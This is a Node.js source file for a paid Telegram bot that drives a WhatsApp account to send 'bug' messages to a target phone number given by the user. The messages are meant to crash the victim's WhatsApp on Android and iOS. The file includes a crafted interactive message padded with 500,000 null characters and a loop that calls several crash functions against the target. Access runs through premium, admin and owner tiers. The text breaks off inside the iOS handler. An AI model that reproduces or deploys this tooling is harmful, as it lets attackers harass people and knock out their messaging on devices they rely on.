const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const path = require('path');
const axios = require('axios');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./config");
const tdxlol = fs.readFileSync('./tdx.jpeg');
const crypto = require('crypto');
const userHasRunTes = new Map();
const cooldownUsers = new Map();
const o = fs.readFileSync(`./o.jpg`)
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

// --- Variabel Global ---
let zephy = null;
let isWhatsAppConnected = false;
const usePairingCode = true; 
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [6645993179];
let ownerList = [6645993179];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const GITHUB_TOKEN = 'https://raw.githubusercontent.com/elainabot13/elaina-bot/refs/heads/main/README.md';  
const REPO_OWNER = '-';  
const REPO_NAME = '-'; 
const FILE_PATH = 'bot_token.json';  

const TOKEN_DATABASE_URL = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}?ref=main`;
async function startBot() {
  try {
    const response = await axios.get(TOKEN_DATABASE_URL, {
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`
      }
    });

    const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
    
    const tokensData = JSON.parse(fileContent);

    if (!tokensData.tokens || !Array.isArray(tokensData.tokens) || tokensData.tokens.length === 0) {
      console.error(chalk.red.bold("Database token kosong atau tidak valid."));
      process.exit(1);
    }

    if (!tokensData.tokens.includes(BOT_TOKEN)) {
      console.error(chalk.red.bold("Hayolo!! Token Bot Lu Ga Kedaftar."));
      process.exit(1); 
    }

    console.log(chalk.green.bold("Mantap Buyer Sejati:D."));
    
  } catch (error) {
    console.error(chalk.red("Terjadi kesalahan saat mengakses database token:", error));
    process.exit(1);
  }
}

startBot();

// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf, Anda bukan user premium. Silakan hubungi developer @rPainzy untuk upgrade.");
    }
};

async function saveOwnerList() {
    const ownerFilePath = path.resolve(__dirname, 'owner.json');
    fs.writeFileSync(ownerFilePath, JSON.stringify(ownerList, null, 2));
}

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    zephy = makeWASocket(connectionOptions);

    zephy.ev.on('creds.update', saveCreds);
    store.bind(zephy.ev);

    zephy.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

(async () => {
    console.log(chalk.whiteBright.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.yellowBright.bold('SYSTEM ANTI CRACK ACTIVE')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));

    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.yellow.bold('SUKSES MEMUAT DATABASE OWNER')}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━❍`));

    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();
    
    startSesi();

    // Menambahkan device ke ListDevice.json saat inisialisasi
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
// --- Command Handler ---

// Command untuk pairing WhatsApp
bot.command("addpairing", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addpairing <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (!phoneNumber.startsWith('62')) {
        return await ctx.reply("❌ Nomor harus diawali dengan 62. Contoh: /addpairing 628xxxxxxxxxx");
    }

    if (zephy && zephy.user) {
        return await ctx.reply("ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await zephy.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
*✅ Pairing Code WhatsApp:*

*Nomor:* ${phoneNumber}
*Kode:* ${formattedCode}
        `;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addadmin <id_user>");
    }

    addAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Maaf, Anda tidak memiliki akses untuk melihat daftar admin.");
    }

    const adminListString = adminList.length > 0
        ? adminList.map(id => `- ${id}`).join("\n")
        : "Tidak ada admin yang terdaftar.";

    const message = `
ℹ️ Daftar Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addprem <id_user> <durasi_hari>");
    }

    const userId = args[1];
    const durationDays = parseInt(args[2]);

    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
    }

    addPremiumUser(userId, durationDays);

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.

*Detail:*
- *ID User:* ${userId}
- *Durasi:* ${durationDays} hari
- *Kadaluarsa:* ${formattedExpiration} WIB

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Cek Status Premium", callback_data: `cekprem_${userId}` }]
            ]
        }
    });
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Premium User *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
    const caption = `Process...`;

    await ctx.reply(caption)
        .then(() => {
            console.log('Proses response sent');
        })
        .catch((error) => {
            console.error('Error sending process response:', error);
        });
};

const donerespone = async (target, ctx) => {
    const caption = `Succesfully`;

    await ctx.reply(caption)
        .then(() => {
            console.log('Done response sent');
        })
        .catch((error) => {
            console.error('Error sending done response:', error);
        });
};

const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

// --- Command /show (Placeholder for your actual crash functions) ---

bot.command("cd", async (ctx) => {
  const userId = ctx.from.id;

  if (!cooldownUsers.has(userId)) {
    return await ctx.reply("Tidak ada cooldown aktif untuk Anda. Anda dapat menggunakan perintah sekarang.");
  }

  const remainingTime = Math.ceil((cooldownUsers.get(userId) - Date.now()) / 1000);

  if (remainingTime > 0) {
    return await ctx.reply(`Cooldown aktif. Harap tunggu ${remainingTime} detik sebelum menggunakan perintah lagi.`);
  } else {
    cooldownUsers.delete(userId);
    return await ctx.reply("Cooldown Anda sudah selesai. Anda dapat menggunakan perintah sekarang.");
  }
});

bot.command("show", checkWhatsAppConnection, checkPremium, async ctx => {
  const userId = ctx.from.id;

  if (cooldownUsers.has(userId)) {
    const remainingTime = Math.ceil((cooldownUsers.get(userId) - Date.now()) / 1000);
    return await ctx.reply(`Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
  }

  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /show 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  userHasRunTes.set(userId, target);

  const buttons = [
    [
      { text: "☕︎ 𝑨𝒏𝒅𝒓𝒐𝑪𝒉𝒊𝒍𝒍", callback_data: `trash_${target}` },
      { text: "⚡ 𝑩𝒆𝒕𝒂𝑪𝒐𝒓𝒆", callback_data: `core_${target}` }
    ],
    [
      { text: "♨︎ 𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞 𝐭𝐨 𝐈𝐨𝐬 𝐁𝐮𝐠", callback_data: `lanjut_${target}` }
    ]
  ];

  const loadingImageUrl = "https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg";

  await ctx.replyWithPhoto(loadingImageUrl, {
    caption: `Click One Of The Buttons To Select The Bug Option
© ᴘᴀɪɴᴢʏ - ᴀssɪsᴛᴀɴᴛ ${q}`,
    reply_markup: {
      inline_keyboard: buttons
    }
  });

  const cooldownDuration = 60000;
  cooldownUsers.set(userId, Date.now() + cooldownDuration);

  setTimeout(() => {
    cooldownUsers.delete(userId);
  }, cooldownDuration);
});
bot.action(/lanjut_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  userHasRunTes.set(ctx.from.id, target);

  const buttons = [
    [
      { text: "☎︎ 𝑰𝒐𝒔𝑿", callback_data: `iosx_${target}` },
      { text: "☏ 𝑿𝒊𝑺", callback_data: `xis_${target}` }
    ],
    [
      { text: "♨︎ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐁𝐮𝐠 𝐀𝐧𝐝𝐫𝐨", callback_data: `back_to_crash_${target}` }
    ]
  ];

  const loadingImageUrl = "https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg";

  await ctx.editMessageCaption(`Pilih metode berikut untuk mengirim bug ke ${target}`, {
    photo: loadingImageUrl,
    reply_markup: {
      inline_keyboard: buttons
    }
  });
});

bot.action(/back_to_crash_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  const buttons = [
    [
      { text: "☕︎ 𝑨𝒏𝒅𝒓𝒐𝑪𝒉𝒊𝒍𝒍", callback_data: `trash_${target}` },
      { text: "⚡ 𝑩𝒆𝒕𝒂𝑪𝒐𝒓𝒆", callback_data: `core_${target}` }
    ],
    [
      { text: "♨︎ 𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞 𝐭𝐨 𝐈𝐨𝐬 𝐁𝐮𝐠", callback_data: `lanjut_${target}` }
    ]
  ];

  const loadingImageUrl = "https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg";

  await ctx.editMessageCaption(`Click One Of The Buttons To Select The Bug Option
© ᴘᴀɪɴᴢʏ - ᴀssɪsᴛᴀɴᴛ`, {
    photo: loadingImageUrl,
    reply_markup: {
      inline_keyboard: buttons
    }
  });
});
//==========FUNC ANDRO===========\\
bot.action(/core_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /show terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("Memulai pengiriman bug untuk Core...");
  
  const loadingImageUrl = "https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg";
  
  try {
    await ctx.editMessageCaption("Mengirim bug Core... Mohon tunggu", {
      photo: loadingImageUrl,
    });

    for (let i = 0; i < 8; i++) {
        await invisblekontak(target);
        await invisblekontak(target);

    }

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`Bug successfully submitted to ${target}.`, {
      photo: loadingImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Developer YouTube", url: "https://youtube.com/@painzyaja" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: loadingImageUrl,
    });
  }
});

bot.action(/trash_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /show terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("Memulai pengiriman bug untuk Trash...");
  
  const loadingImageUrl = "https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg";
  
  try {
    await ctx.editMessageCaption("Mengirim bug Trash... Mohon tunggu", {
      photo: loadingImageUrl,
    });

    for (let i = 0; i < 8; i++) {
        await invisblekontak(target);
        await invisblekontak(target);

    }

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`Bug successfully submitted to ${target}.`, {
      photo: loadingImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝙎𝙪𝙥𝙥𝙤𝙧𝙩 𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚", url: "https://youtube.com/@painzyaja" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: loadingImageUrl,
    });
  }
});
//=========FUNC IOS=========\\
bot.action(/iosx_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /show terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("Memulai pengiriman IosX...");
  
  const loadingImageUrl = "https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg";
  
  try {
    await ctx.editMessageCaption("Mengirim bug IosX... Mohon tunggu", {
      photo: loadingImageUrl,
    });

    for (let i = 0; i < 8; i++) {
      await IosMJ(target, ptcp = true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, ptcp = true);
        await XiosVirus(target);
    }

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`Bug successfully submitted to ${target}.`, {
      photo: loadingImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝙎𝙪𝙥𝙥𝙤𝙧𝙩 𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚", url: "https://youtube.com/@painzyaja" }
